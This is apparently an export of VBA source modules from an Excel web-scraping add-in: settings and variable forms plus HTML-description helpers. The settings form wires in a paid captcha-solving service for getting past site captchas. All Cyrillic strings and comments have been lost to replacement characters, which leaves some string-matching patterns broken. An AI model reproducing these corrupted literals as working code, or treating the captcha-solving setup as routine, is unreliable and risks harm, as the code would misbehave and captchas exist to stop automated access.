    SETT.SetText "TextBox_CaptchaAPIkey", APIkey$ ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
End Sub

Private Sub Image_ExportSettings_Click()
    ExportSettings
End Sub

Private Sub Image_ImportSettings_Click()
    If Not ImportSettings Then Exit Sub
    Delay$ = Replace(Format(CDbl(TimeSerial(0, 0, 1)) * 0.3, "0.000000000"), ",", ".")
    ExecuteExcel4Macro "ON.TIME(NOW()+" & Delay$ & ", ""'" & ThisWorkbook.Name & "'!ShowSettingsPage"")"
    Unload Me
End Sub

Private Sub Label_DeveloperMode_VideoTutorial_Click()
    On Error Resume Next: FWF.FollowHyperlink "http://excelvba.ru/programmes/Parser/manuals/ExtraSetupOptions"
End Sub

Private Sub Label_Open_SETTINGS_BACKUP_FOLDER_Click()
    On Error Resume Next: FWF.OpenFolder SETTINGS_BACKUP_FOLDER$
End Sub

Private Sub Label_OpenCacheFolder_Click()
    On Error Resume Next: FWF.OpenFolder CACHE_FOLDER$
End Sub

Private Sub Label_OpenParsersCurrentFolder_Click()
    On Error Resume Next: FWF.OpenFolder CURRENT_XLP_FOLDER$
End Sub

Private Sub Label_OpenParsersFolder_Click()
    On Error Resume Next: FWF.OpenFolder PARSERS_FOLDER$
End Sub

Private Sub CommandButton_SelectParsersFolder_Click()
    On Error Resume Next
    NewFolder$ = FWF.GetFolderPath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", PARSERS_FOLDER$)
    If NewFolder$ = "" Then Exit Sub
    Me.TextBox_ParsersFolder = Replace(NewFolder$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
End Sub

Private Sub Label_OpenPluginFolder_Click()
    On Error Resume Next: FWF.OpenFolder PLUGIN_FOLDER$(True)
End Sub

Private Sub Label_ParsersFolder_Reset_Click()
    On Error Resume Next
    ResetActiveFolder
    Check_XLP_Folder
End Sub

Sub Check_XLP_Folder()
    Dim res As Boolean: res = CURRENT_XLP_FOLDER$ <> ""
    Me.Label_ParsersFolder_Current.Visible = res
    Me.Label_ParsersFolder_Reset.Visible = res
    Me.Label_OpenParsersCurrentFolder.Visible = res
    Me.TextBox_ParsersFolder_Current.Visible = res
    Me.TextBox_ParsersFolder_Current = Replace(CURRENT_XLP_FOLDER$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
End Sub

Private Sub Label_RuCaptcha_Account_Click()
    FollowHyperlink "https://rucaptcha.com?from=2405413"
End Sub

Private Sub Label196_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/settings/main"
End Sub
Private Sub Label197_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/settings/extra"
End Sub
Private Sub Label198_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/settings/captcha"
End Sub
Private Sub Label199_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/settings/proxy"
End Sub
Private Sub Label200_Click()
    ShowManual "https://excelvba.ru/programmes/Parser/manuals/interface/settings/plugins"
End Sub
Private Sub Label201_Click()
    ShowManual "https://ExcelVBA.ru/programmes/Parser/manuals/captcha/RuCaptchaSetup"
End Sub

Private Sub MultiPageSettings_Change()
    On Error Resume Next
    '    If Me.MultiPageSettings.value = Me.MultiPageSettings.Pages("Page_Captcha").Index Then
    '        Me.Label_Captcha_Info = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
    '        Me.Label_Captcha_Info = RuCaptcha_Info
    '    End If
End Sub

Private Sub TextBox_CaptchaAPIkey_Change()
    Me.CommandButton_test_solve_captcha.Enabled = Len(Me.TextBox_CaptchaAPIkey) > 0
End Sub


Private Sub UserForm_Initialize()
    On Error Resume Next
    For i = 50 To 150 Step 2
        Me.ComboBox_Zoom.AddItem i & " %"
    Next
    For i = 10 To 200 Step 10
        Me.ComboBox_MaxBalloons.AddItem i
    Next
    
    ' special controls
    Dim ctrl As MSForms.Control, SC As SpecialControl
    Set SpecialControlsCollection = New Collection
    For Each ctrl In Me.Controls
        If TypeName(ctrl) = "ScrollBar" And ctrl.Tag = "ScrollCombo" Then
            Set SC = New SpecialControl: Set SC.Scroller = ctrl
            If SC.FieldFound Then SpecialControlsCollection.Add SC
        End If
    Next
    
    If CURRENT_XLP_FOLDER$ = "" Then SETT.SetText "TextBox_ParsersFolder", Replace(PARSERS_FOLDER$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
    SETT.LoadIntoSettingForm Me
    
    TranslateUserForm Me
    
    Me.MultiPageSettings.value = 0
    Check_XLP_Folder
    If Val(Me.ComboBox_Zoom) < 40 Then Me.ComboBox_Zoom = "100 %"
End Sub

Sub LoadProgramSettings()
    On Error Resume Next: Dim ctrl As Control: NoSetting$ = "not found"
    For Each ctrl In Me.Controls
        stg = GetSetting(PROJECT_NAME$, "Settings", ctrl.Name, NoSetting$)
        If ctrl.Name Like "CheckBox*" Then
            If stg <> NoSetting$ Then stg = CBool(stg) Else stg = False
        End If
        If (ctrl.Tag = "") And (stg <> NoSetting$) Then ctrl.value = stg
        Next: Err.Clear
    End Sub
    
    Sub SaveProgramSettings()
        On Error Resume Next: Dim ctrl As Control
        For Each ctrl In Me.Controls
            If ctrl.Enabled Then
                If Not ctrl.Name Like "CommandButton_*" And Not ctrl.Tag = "ScrollCombo" Then
                    SETT.SetText ctrl.Name, Replace(ctrl.value, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
                End If
            End If
            Next: Err.Clear
        End Sub
        
        Private Sub CommandButton_SaveSettings_Click()
            On Error Resume Next
            SETT.SaveAllFromSettingForm Me
            
            Dim NeedUpdateToolbar As Boolean
            NeedUpdateToolbar = Me.TextBox_ParsersFolder <> SETT.GetText("TextBox_ParsersFolder", Me.TextBox_ParsersFolder)
            NeedUpdateToolbar = NeedUpdateToolbar Or Me.DeveloperMode <> SETT.GetBoolean("DeveloperMode")
            SaveProgramSettings
            If NeedUpdateToolbar Then UpdateAddinToolbar
            Unload Me
        End Sub
        
        Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
            On Error Resume Next: Set SpecialControlsCollection = Nothing
        End Sub
        
Attribute VB_Name = "F_Variable_Edit"
Attribute VB_Base = "0{B0862C59-1819-4935-901C-3C0930057CC4}{6F016D5D-FCD7-431B-9340-DA9655604EA4}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Variable_Edit                    Version:
' Author        : Igor Vakhnenko                   Date: 25.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text
Dim Var As Variable, BlankValue As Boolean, StatusOK As Boolean
Public StopVarEvents As Boolean

Private Sub CheckBox_Hidden_Click()
    On Error Resume Next: If StopVarEvents Then Exit Sub
    Var.Hidden = Me.CheckBox_Hidden.value
    RaiseVariableChangeEvent
End Sub

Private Sub ComboBox_ControlType_Change()
    On Error Resume Next: If StopVarEvents Then Exit Sub
    Var.ControlType = Me.ComboBox_ControlType
    RaiseVariableChangeEvent
End Sub

Sub RaiseVariableChangeEvent()
    On Error Resume Next
    Me.Frame_Preview.Controls.Clear
    StatusOK = Var.CreateControl(Me.Frame_Preview, 1, 1)
    Me.Frame_Preview.Visible = StatusOK
End Sub

Sub FillVariableParameters()
    On Error Resume Next
    With Var
        Me.ComboBox_ControlType = .ControlType
        Me.TextBox_Name = .Name
        Me.TextBox_DefaultValue = .DefaultValue
        Me.TextBox_LabelText = .LabelText
        Me.TextBox_Source = .Source
        Me.CheckBox_Hidden = .Hidden
    End With
End Sub

Private Sub TextBox_DefaultValue_Change()
    On Error Resume Next: If StopVarEvents Then Exit Sub
    Var.DefaultValue = Me.TextBox_DefaultValue
    If BlankValue Then Var.value = Var.DefaultValue
    RaiseVariableChangeEvent
End Sub

Private Sub TextBox_LabelText_Change()
    On Error Resume Next: If StopVarEvents Then Exit Sub
    Var.LabelText = Me.TextBox_LabelText
    RaiseVariableChangeEvent
End Sub

Private Sub TextBox_Name_Change()
    On Error Resume Next: If StopVarEvents Then Exit Sub
    Var.Name = Trim(Me.TextBox_Name)
    RaiseVariableChangeEvent
End Sub

Private Sub TextBox_Source_Change()
    On Error Resume Next: If StopVarEvents Then Exit Sub
    Var.Source = Me.TextBox_Source
    RaiseVariableChangeEvent
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    Set Var = New Variable

    StopVarEvents = True
    Me.ComboBox_ControlType.AddItem "TextBox"
    Me.ComboBox_ControlType.AddItem "TextBox password"
    Me.ComboBox_ControlType.AddItem "ComboBox"
    Me.ComboBox_ControlType.AddItem "ComboBox list"
    Me.ComboBox_ControlType.AddItem "ComboBox AddOption_ALL"
    Me.ComboBox_ControlType.AddItem "CheckBox"
    Me.ComboBox_ControlType.AddItem "ListBox"
    Me.ComboBox_ControlType.AddItem "ListBox option"
    Me.ComboBox_ControlType.AddItem "ListBox MultiSelect=Single"
    Me.ComboBox_ControlType.AddItem "ListBox MultiSelect=Multi"
    Me.ComboBox_ControlType.AddItem "ListBox MultiSelect=Extended"

    If Not EditingVariable_XMLNode Is Nothing Then
        Var.LoadFromXML EditingVariable_XMLNode
    End If
    If Var.Index = 0 Then    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Var.ControlType = "TextBox"
        Var.LabelText = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
    BlankValue = Var.value = ""

    Set EditingVariable_XMLNode = Nothing
    FillVariableParameters
    StopVarEvents = False
    RaiseVariableChangeEvent

    ApplyZoomTo Me
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
    On Error Resume Next
    Set Var = Nothing
End Sub

Private Sub CommandButton_Cancel_Click()
    Set EditingVariable_XMLNode = Nothing
    Set Var = Nothing
    Unload Me
End Sub

Sub CommandButton_OK_Click()
    On Error Resume Next
    If Not StatusOK Then FormSetError Me, "ComboBox_ControlType", "Label_ControlType": Exit Sub
    If Trim(Var.Name) = "" Then FormSetError Me, "TextBox_Name", "Label_Name": Exit Sub
    If Trim(Var.LabelText) = "" Then FormSetError Me, "TextBox_LabelText", "Label_LabelText": Exit Sub

    Set EditingVariable_XMLNode = Var.ExportToXML
    Set Var = Nothing
    Unload Me
End Sub

Attribute VB_Name = "F_Variables"
Attribute VB_Base = "0{D5A9A0BD-5AD1-4F37-A9D1-62247CB618F3}{495E3F39-A309-467E-8C3D-12AE7507B92E}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : F_Variables                    Version:
' Author        : Igor Vakhnenko                   Date: 27.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Private Sub CommandButton_Cancel_Click()
    On Error Resume Next
    VariablesDialogResult = False
    Me.FrameMain.Controls.Clear
    Unload Me
End Sub

Private Sub CommandButton_OK_Click()
    On Error Resume Next
    VariablesDialogResult = True
    VariablesToShow.SaveCurrentValues
    Me.FrameMain.Controls.Clear
    Unload Me
End Sub

Private Sub UserForm_Initialize()
    On Error Resume Next
    TranslateUserForm Me
    If VariablesToShow Is Nothing Then MsgBox tt("F_Variables_MessageIfBlank"), vbExclamation: Exit Sub

    VariablesToShow.CreateControls Me.FrameMain
End Sub
Attribute VB_Name = "F_char"
Attribute VB_Base = "0{51C6F72A-E21F-4C5D-8A6F-45A766337F82}{0144AE79-37E6-4D28-91B8-9E9A428D0F1A}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Fchar
' Author        : EducatedFool                     Date: 12.05.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Dim StopEvents As Boolean

Private Sub CommandButton2_Click()
    Me.Hide
End Sub

Private Sub ListBox_res_Click()
    On Error Resume Next
    n = Me.ListBox_res.ListIndex
    Me.TextBox_txt.SelStart = n
    Me.TextBox_txt.SelLength = 1
    Me.TextBox_txt.SetFocus
End Sub

Private Sub TextBox_txt_Change()
    If StopEvents Then Exit Sub
    Me.DisplayText
End Sub

Sub DisplayText(Optional ByVal txt$)
    On Error Resume Next:
    Me.ListBox_res.Clear
    If txt = "" Then
        txt = Me.TextBox_txt
    Else
        StopEvents = True
        Me.TextBox_txt = txt
        StopEvents = False
    End If
    Me.ListBox_res.list = ParseString(txt)
    Me.Label_len.Caption = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & Len(txt) & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
End Sub

Attribute VB_Name = "HDF"
'---------------------------------------------------------------------------------------
' Module        : HDF
' Author        : EducatedFool                     Date: 02.05.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

' HTML DESCRIPTION FUNCTIONS
Option Explicit
Option Private Module

Function SampleValues_ForDescriptionHTML(ByRef sd As ParserSourceData) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    On Error Resume Next
    Dim ValueType$, FormattedValue$, OutputHTML$, i&, txt$, w&
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8249, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8250
    Const TEXTFIELD_HTML$ = "|fffd|input readonly class=""aa-inline-value"" style=""width: WWWem;"" type=""text"" value=""XXX"" /|fffd|"
    Const br$ = "|fffd|br /|fffd|"
    
    For i = 1 To Application.min(sd.Items.Count, 15)
        w& = Application.max(8, Application.min(40, (Len(sd.Items(i).value) + 1) \ 2))
        OutputHTML$ = OutputHTML$ & Replace(Replace(TEXTFIELD_HTML$, "WWW", w&), "XXX", sd.Items(i).value)        '& BR$
        txt$ = txt$ & sd.Items(i).value: If Len(txt) > 300 Then Exit For
    Next
    
    OutputHTML$ = Replace(Replace(OutputHTML$, ">", "&gt;"), "<", "&lt;")
    SampleValues_ForDescriptionHTML = Replace(Replace(OutputHTML$, "|fffd|", ">"), "|fffd|", "<")
End Function

Function AddSampleValuesIntoDescriptionHTML(ByRef sd As ParserSourceData) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    On Error Resume Next
    Dim action_name$, result_column$
    action_name$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    action_name$ = vbTab & vbTab & "<td class=""action-name"" style=""width: 20%;"">" & action_name$ & "</td>" & vbNewLine
    result_column$ = vbTab & vbTab & "<td class=""result-value"" style=""width: 80%;""><!--noindex-->" & SampleValues_ForDescriptionHTML(sd) & _
        "<!--/noindex--></td>" & vbNewLine
    
    DescriptionText = DescriptionText & "<table class=""ArrayActions table-type-source-values-sample"">" & vbNewLine & "<tbody>" & _
        vbTab & "<tr class=""row-type-source-values-sample"">" & vbNewLine & action_name$ & vbTab & vbTab & vbNewLine & result_column$ & vbTab & _
        "</tr>" & vbNewLine & "</tbody>" & vbNewLine & "</table>"
    
    'DescriptionText = DescriptionText & "<h4>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| " & SD.Items.Count & _
        ") |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  (" & SD.Items(1).Value & "):" & "</h4>"
    PublishHTML_ShowCurrentValue "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", sd.Items(1).value
    
    PublishHTML_CloseTable        ' "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "table-source-data"
    
    If DescriptionText Like "*|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| </h3>*" Then
        DescriptionText = Split(DescriptionText, "<h3>|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| </h3>")(0) & _
            "<h3 style=""margin: 0;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</h3>" & vbNewLine & "</table>" & _
            Split(DescriptionText, "</table>")(UBound(Split(DescriptionText, "</table>")))
    End If
End Function

Function PublishHTML_GetActionsTableHeader() As String
    PublishHTML_GetActionsTableHeader = vbNewLine & "<table class=""ArrayActions"">" & vbNewLine & _
        "<thead><tr><th style=""width: 20%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><th style=""width: 15%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th>" & _
        "<th style=""width: 15%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</th><th style=""width: 50%;"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)</th></tr></thead>" & _
        vbNewLine & "<tbody>" & vbNewLine
End Function
Function PublishHTML_GetActionsTableFooter() As String
    PublishHTML_GetActionsTableFooter = "</tbody>" & vbNewLine & "</table>" & vbNewLine
End Function

Sub PublishHTML_StartNewTable(ByVal Header$, ByVal TableClass$, Optional ByVal IsMainTable As Boolean)
    If Not DESCRIPTION_MODE Then Exit Sub
    On Error Resume Next: Dim txt$
    txt$ = vbNewLine & "<div class=""" & IIf(IsMainTable, "parser-main-table ", "") & TableClass$ & " parser-table""><table class=""" & TableClass$ & " parser-table"">" & vbNewLine & _
        "<thead><tr><th><div class=""" & TableClass$ & "-header parser-table-header"">" & Header$ & "</div></th></tr></thead>" & vbNewLine & _
        "<tbody><tr><td><div class=""" & TableClass$ & "-content"">" & vbNewLine
    DescriptionText = DescriptionText & txt$
End Sub

Sub PublishHTML_CloseTable()
    If Not DESCRIPTION_MODE Then Exit Sub
    On Error Resume Next: Dim txt$
    txt$ = "</div></td></tr></tbody>" & vbNewLine & "</table></div>" & vbNewLine
    DescriptionText = DescriptionText & txt$
End Sub

Sub PublishHTML_ShowCurrentValue(ByVal Description$, ByVal values$)
    If Not DESCRIPTION_MODE Then Exit Sub
    On Error Resume Next: Dim txt$, arr
    If values = "" Then arr = Array("") Else arr = Split(values, ARSEP)
    
    ' DescriptionText = DescriptionText & "<br />"
    '    If UBound(arr) = 0 Then
    '        subDescr$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    '    Else
    '        subDescr$ = "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| " & UBound(arr) + 1 & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
    '    End If
    '    subDescr$ = subDescr$ & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (" & Me.Items.Count & " |fffd||fffd|.)"        '& "<br />"
    
    ' AddSpecialRowIntoHTMLDescription 1, Description$, arr(0)
    
    Dim action_name$, result_column$
    action_name$ = vbTab & vbTab & "<td class=""action-name"" style=""width: 50%;"">" & Description$ & "</td>" & vbNewLine
    result_column$ = vbTab & vbTab & "<td class=""result-value"" style=""width: 50%;""><!--noindex-->" & ValueDescriptionHTML(values$) & _
        "<!--/noindex--></td>" & vbNewLine
    
    DescriptionText = DescriptionText & "<div class=""parser-current-value"">" & "<table class=""parser-current-value"">" & vbNewLine & "<tbody>" & _
        vbTab & "<tr class=""parser-current-value"">" & vbNewLine & action_name$ & vbTab & vbTab & vbNewLine & _
        result_column$ & vbTab & "</tr>" & vbNewLine & "</tbody>" & vbNewLine & "</table></div>"
    
    
    If UBound(arr) > 0 Then
        DescriptionText = DescriptionText & "<br />" & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:"        ' & "<br />"
    End If
    
    DescriptionText = DescriptionText & txt$
End Sub

Function ValueDescriptionHTML(ByVal txt$, Optional ByVal LargeFields As Boolean = False, _
        Optional ByVal WithoutChanges As Boolean = False) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML
    On Error Resume Next
    Dim ValueType$, FormattedValue$, OutputHTML$, MaxArrayItemsCount&, i&, arr, TEXTAREA_HTML$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8249, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| - |fffd| Alt + 8250
    Const br$ = "|fffd|br /|fffd|", TEXTFIELD_HTML$ = "|fffd|input readonly class=""aa-value"" type=""text"" value=""XXX"" /|fffd|"
    MaxArrayItemsCount& = IIf(LargeFields, 8, 6)
    TEXTAREA_HTML$ = "|fffd|textarea readonly rows=""" & MaxArrayItemsCount& & """ class=""aa-value""|fffd|XXX|fffd|/textarea|fffd|"
    
    txt = Replace(txt, """", "&quot;")
    
    If InStr(1, txt, ARSEP, vbTextCompare) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        
        ValueType$ = "|fffd|strong|fffd||fffd||fffd||fffd||fffd||fffd||fffd|/strong|fffd| |fffd||fffd| " & UBound(Split(txt, ARSEP)) + 1 & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & br$
        
        arr = "": arr = Split(txt, ARSEP)
        If UBound(arr) <= MaxArrayItemsCount& Then
            FormattedValue$ = Replace(txt, ARSEP, vbNewLine)
        Else
            For i = LBound(arr) To MaxArrayItemsCount& - 2
                FormattedValue$ = FormattedValue$ & IIf(FormattedValue$ = "", "", vbNewLine) & arr(i)
            Next i
            FormattedValue$ = FormattedValue$ & vbNewLine & "... (|fffd||fffd||fffd| " & ItemsCountTXT(UBound(arr) + 2 - MaxArrayItemsCount&) & ")"
        End If
        
        If Len(FormattedValue$) > 1000 Then
            '            ValueType$ = ValueType$ & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & CharsCountTXT(Len(txt)) & ")" & BR$
        End If
        
        If (FormattedValue$ Like "http*") Or (FormattedValue$ Like "*" & vbNewLine & "http*") Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| code |fffd||fffd||fffd||fffd||fffd||fffd| textarea
            TEXTAREA_HTML$ = "|fffd|code rows=""" & MaxArrayItemsCount& & """ class=""aa-value""|fffd|XXX|fffd|/code|fffd|"
        End If
        
        OutputHTML$ = ValueType$ & Replace(TEXTAREA_HTML$, "XXX", FormattedValue$)
        
        
    ElseIf InStr(1, txt, TEMP_ARSEP$, vbTextCompare) Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        
        ValueType$ = "|fffd|strong|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|/strong|fffd| |fffd||fffd| " & UBound(Split(txt, TEMP_ARSEP$)) + 1 & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & br$
        
        arr = "": arr = Split(txt, TEMP_ARSEP$)
        If UBound(arr) <= MaxArrayItemsCount& Then
            FormattedValue$ = Replace(txt, TEMP_ARSEP$, vbNewLine)
        Else
            For i = LBound(arr) To MaxArrayItemsCount& - 2
                FormattedValue$ = FormattedValue$ & IIf(FormattedValue$ = "", "", vbNewLine) & arr(i)
            Next i
            FormattedValue$ = FormattedValue$ & vbNewLine & "... (|fffd||fffd||fffd| " & ItemsCountTXT(UBound(arr) + 2 - MaxArrayItemsCount&) & ")"
        End If
        
        If Len(FormattedValue$) > 1000 Then
            '            ValueType$ = ValueType$ & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, " & CharsCountTXT(Len(txt)) & ")" & BR$
        End If
        
        If (FormattedValue$ Like "http*") Or (FormattedValue$ Like "*" & vbNewLine & "http*") Then
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| code |fffd||fffd||fffd||fffd||fffd||fffd| textarea
